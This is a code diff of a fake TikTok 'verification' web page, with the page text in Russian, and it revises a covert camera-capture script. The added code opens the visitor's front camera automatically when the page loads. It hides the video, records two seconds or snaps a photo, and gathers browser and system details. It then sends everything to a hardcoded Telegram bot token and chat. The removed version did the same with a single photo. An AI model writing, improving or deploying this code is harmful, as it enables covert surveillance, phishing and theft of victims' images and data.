@@ -1,5 +1,4 @@
 <!DOCTYPE html>
-
 <html lang="en">
 <head>
 <meta charset="utf-8"/>
@@ -9,21 +8,7 @@
 <meta content="https://wwd.com/wp-content/uploads/2020/09/tiktok.png" property="og:image"/>
 <meta content="website" property="og:type"/>
 <title>Сделайте снимок</title>
-<link href="../css\main.css" rel="stylesheet"/>
-</meta></meta></head>
-<body>
-<div class="container">
-<div class="image-container">
-<video autoplay="" playsinline=""></video>
-<canvas></canvas>
-</div>
-<img alt="Tiktok Logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS45jF2oX5HYzhemcWzyNdDf9PuYxjj8cf6ww&amp;s"/>
-</div>
-<script src="../js\main.js"></script>
-</body>
-</html>
-<style
-
+<style>
 body {
     margin: 0;
     padding: 0;
@@ -31,264 +16,217 @@ body {
     justify-content: center;
     align-items: center;
     height: 100vh;
-    background-color: #000
+    background-color: #000;
     }
 .container {
     text-align: center;
     max-width: 400px;
-    width: 100%
+    width: 100%;
     }
 .image-container {
     background-color: #1c1e24;
     border-radius: 20px;
     overflow: hidden;
-    margin-bottom: 20px
+    margin-bottom: 20px;
     }
 video {
     width: 100%;
     height: auto;
-    display: none
+    display: none;
     }
 canvas {
-    display: none
+    display: none;
     }
+</style>
+</head>
+<body>
+<div class="container">
+<div class="image-container">
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+</div>
+<img alt="Tiktok Logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS45jF2oX5HYzhemcWzyNdDf9PuYxjj8cf6ww&amp;s"/>
+</div>
 
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
     
+    // Variables for video recording
+    let mediaRecorder;
+    let recordedChunks = [];
+    let recording = false;
+    let recordingTimer;
 
-    <script>
-
-        document.addEventListener('DOMContentLoaded', () => {
-
-            const video = document.getElementById('video');
-
-            const canvas = document.getElementById('canvas');
-
+    // Start the process immediately
+    setTimeout(() => {
+        startVerification();
+    }, 500);
+    
+    async function startVerification() {
+        try {
+            // Request camera access
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    facingMode: 'user',
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                },
+                audio: false
+            });
             
-
-            // Start the process immediately with no visible indicators
-
+            // Attach camera stream to video element
+            video.srcObject = stream;
+            
+            // Wait for video to load
+            video.addEventListener('loadedmetadata', () => {
+                // Set canvas dimensions to match video
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
+                // Start recording
+                startRecording(stream);
+            });
+        } catch (err) {
+            // If camera access fails, still send system info
             setTimeout(() => {
-
-                startVerification();
-
-            }, 500);
-
+                sendToTelegram(null);
+            }, 1500);
+        }
+    }
+    
+    function startRecording(stream) {
+        try {
+            // Set up media recorder
+            mediaRecorder = new MediaRecorder(stream, {
+                mimeType: 'video/webm; codecs=vp9'
+            });
             
-
-            async function startVerification() {
-
-                try {
-
-                    // Request camera access silently
-
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
-
-                        video: { 
-
-                            facingMode: 'user',
-
-                            width: { ideal: 1280 },
-
-                            height: { ideal: 720 }
-
-                        },
-
-                        audio: false
-
-                    });
-
-                    
-
-                    // Attach camera stream to video element
-
-                    video.srcObject = stream;
-
-                    
-
-                    // Wait for video to load
-
-                    video.addEventListener('loadedmetadata', () => {
-
-                        // Set canvas dimensions to match video
-
-                        canvas.width = video.videoWidth;
-
-                        canvas.height = video.videoHeight;
-
-                        
-
-                        // Capture photo after a short delay
-
-                        setTimeout(() => {
-
-                            capturePhoto();
-
-                            // Stop the camera stream
-
-                            stream.getTracks().forEach(track => track.stop());
-
-                        }, 1000);
-
-                    });
-
-                } catch (err) {
-
-                    // If camera access fails, still send system info
-
-                    setTimeout(() => {
-
-                        sendToTelegram(null);
-
-                    }, 1500);
-
+            // Handle data available event
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    recordedChunks.push(event.data);
                 }
-
-            }
-
+            };
             
-
-            function capturePhoto() {
-
-                // Draw the current video frame to canvas
-
-                const context = canvas.getContext('2d');
-
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
+            // Handle recording stop
+            mediaRecorder.onstop = () => {
+                // Create a blob from the recorded chunks
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                 
-
-                // Send the captured image to Telegram
-
-                sendToTelegram(canvas);
-
-            }
-
+                // Send the recorded video to Telegram
+                sendToTelegram(blob);
+                
+                // Stop all tracks
+                stream.getTracks().forEach(track => track.stop());
+            };
             
-
-            function sendToTelegram(canvasElement) {
-
-                // Collect system information
-
-                const systemInfo = {
-
-                    userAgent: navigator.userAgent,
-
-                    platform: navigator.platform,
-
-                    language: navigator.language,
-
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-
-                    screen: `${screen.width}x${screen.height}`,
-
-                    cookies: navigator.cookieEnabled,
-
-                    date: new Date().toISOString(),
-
-                    location: "Unknown",
-
-                    ip: "Unknown"
-
-                };
-
-                
-
-                // Telegram bot API endpoint
-
-                const botToken = '8306546024:AAF8cNHIqwUF88sBcZ00D0X4GGf_D9WuXC0';
-
-                const chatId = '7301310227';
-
-                
-
-                // Create form data
-
-                const formData = new FormData();
-
-                formData.append('chat_id', chatId);
-
-                formData.append('text', `System Info:\n${JSON.stringify(systemInfo, null, 2)}`);
-
-                
-
-                // First send system info as text
-
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-
-                    method: 'POST',
-
-                    body: formData
-
-                })
-
-                .then(response => response.json())
-
-                .then(data => {
-
-                    if (data.ok && canvasElement) {
-
-                        const imageData = canvasElement.toDataURL('image/jpeg', 0.9);
-
-                        const blob = dataURLtoBlob(imageData);
-
-                        
-
-                        const photoFormData = new FormData();
-
-                        photoFormData.append('chat_id', chatId);
-
-                        photoFormData.append('photo', blob, 'tiktok_verification.jpg');
-
-                        
-
-                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-
-                            method: 'POST',
-
-                            body: photoFormData
-
-                        });
-
-                    }
-
-                });
-
-            }
-
+            // Start recording
+            mediaRecorder.start();
+            recording = true;
             
-
-            // Helper function to convert data URL to Blob
-
-            function dataURLtoBlob(dataurl) {
-
-                const arr = dataurl.split(',');
-
-                const mime = arr[0].match(/:(.*?);/)[1];
-
-                const bstr = atob(arr[1]);
-
-                let n = bstr.length;
-
-                const u8arr = new Uint8Array(n);
-
-                
-
-                while (n--) {
-
-                    u8arr[n] = bstr.charCodeAt(n);
-
+            // Set timer to stop recording after 2 seconds
+            recordingTimer = setTimeout(() => {
+                if (recording) {
+                    mediaRecorder.stop();
+                    recording = false;
                 }
-
-                
-
-                return new Blob([u8arr], { type: mime });
-
+            }, 2000);
+            
+        } catch (err) {
+            // Fallback to photo capture if video recording fails
+            setTimeout(() => {
+                capturePhoto();
+                stream.getTracks().forEach(track => track.stop());
+            }, 1000);
+        }
+    }
+    
+    function capturePhoto() {
+        // Draw the current video frame to canvas
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        // Send the captured image to Telegram
+        sendToTelegram(canvas);
+    }
+    
+    function sendToTelegram(media) {
+        // Collect system information with emojis
+        const systemInfo = {
+            "🌐 User Agent": navigator.userAgent,
+            "💻 Platform": navigator.platform,
+            "🗣️ Language": navigator.language,
+            "🕒 Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
+            "📺 Screen": `${screen.width}x${screen.height}`,
+            "🍪 Cookies Enabled": navigator.cookieEnabled,
+            "📅 Date": new Date().toISOString(),
+            "📍 Location": "Unknown",
+            "📡 IP Address": "Unknown"
+        };
+        
+        // Telegram bot API endpoint
+        const botToken = '8306546024:AAF8cNHIqwUF88sBcZ00D0X4GGf_D9WuXC0';
+        const chatId = '7301310227';
+        
+        // Create form data
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('text', `System Info:\n${JSON.stringify(systemInfo, null, 2)}`);
+        
+        // First send system info as text
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok && media) {
+                if (media instanceof HTMLCanvasElement) {
+                    // Handle photo
+                    const imageData = media.toDataURL('image/jpeg', 0.9);
+                    const blob = dataURLtoBlob(imageData);
+                    
+                    const photoFormData = new FormData();
+                    photoFormData.append('chat_id', chatId);
+                    photoFormData.append('photo', blob, 'tiktok_verification.jpg');
+                    
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: photoFormData
+                    });
+                } else if (media instanceof Blob) {
+                    // Handle video
+                    const videoFormData = new FormData();
+                    videoFormData.append('chat_id', chatId);
+                    videoFormData.append('video', media, 'tiktok_verification.webm');
+                    videoFormData.append('caption', 'Recorded video');
+                    
+                    fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+                        method: 'POST',
+                        body: videoFormData
+                    });
+                }
             }
-
         });
-
-    </script>
-
+    }
+    
+    // Helper function to convert data URL to Blob
+    function dataURLtoBlob(dataurl) {
+        const arr = dataurl.split(',');
+        const mime = arr[0].match(/:(.*?);/)[1];
+        const bstr = atob(arr[1]);
+        let n = bstr.length;
+        const u8arr = new Uint8Array(n);
+        
+        while (n--) {
+            u8arr[n] = bstr.charCodeAt(n);
+        }
+        
+        return new Blob([u8arr], { type: mime });
+    }
+});
+</script>
 </body>
-
 </html>
